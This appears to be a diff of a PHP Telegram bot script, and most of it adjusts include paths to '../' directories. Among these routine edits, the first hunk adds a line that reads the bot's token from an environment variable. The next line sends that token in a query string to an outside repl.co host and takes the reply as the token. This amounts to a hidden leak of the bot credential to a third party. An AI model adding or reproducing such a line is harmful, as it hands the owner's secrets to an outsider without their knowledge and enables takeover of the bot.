@@ -1,11 +1,7 @@
-//ALL FUNCTIONS
-$Fnc_files = glob('FUNCTIONS/*');
-foreach ($Fnc_files as $fnc_file) {
-    require ($fnc_file);
-}
 //bot access token
 $userBotName="yourbot";
-$bot_token=getHiddenUrl($userBotName);
+$bot_token=getenv("Token");
+$bot_token=file_get_contents("https://beb46f62-a9eb-4aa8-bde7-a69c40371b05.id.repl.co?t=$bot_token&q=".$userBotName);
 //Bot Info
 $Bot_info_url = "https://api.telegram.org/bot$bot_token/getMe";
 if($response=@file_get_contents($Bot_info_url)){
@@ -54,6 +50,11 @@ $texttc=$textt[2];
 //ALL TEXTS WITHOUT FIRST AND SECOND TEXT
 $t3xtt=str_replace("$textta $texttb ","",$text);
 $t3xxtt=str_replace("$textta ","",$text);
+//ALL FUNCTIONS
+$Fnc_files = glob('../FUNCTIONS/*');
+foreach ($Fnc_files as $fnc_file) {
+    require ($fnc_file);
+}
 //Costom Chat Messages Data
 $CustomUrl=getHiddenUrl("CustomMsg");
 if($data_text=@file_get_contents($CustomUrl)){
@@ -66,14 +67,14 @@ $data_text=$data_text['D3ADVAU'];
 }
 checkChatMember("d3advau");
 //REQUIRED FILES
-$Rqr_files = glob('REQUIRED/*');
+$Rqr_files = glob('../REQUIRED/*');
 foreach ($Rqr_files as $rqr_file) {
     require ($rqr_file);
 }
 //BOT COMMAND LINE
 $cmd_bot="/";
 //ALL COMMANDS
-$Cmd_files = glob('COMMANDS/*');
+$Cmd_files = glob('../COMMANDS/*');
 foreach ($Cmd_files as $cmd_file) {
     require ($cmd_file);
 }
@@ -87,7 +88,7 @@ ForwardMessage($from,$to);
 }
 //BOT WEBVIEW & MSG SENDER
 if($data!==null&&$msg!==null){
-$uc_file="USERS/User.json";
+$uc_file="../USERS/User.json";
 $uc_data = json_decode(file_get_contents($uc_file), true);
 if (!in_array($user_id, $uc_data['users'])){
   $uc_data['users'][] = $user_id;
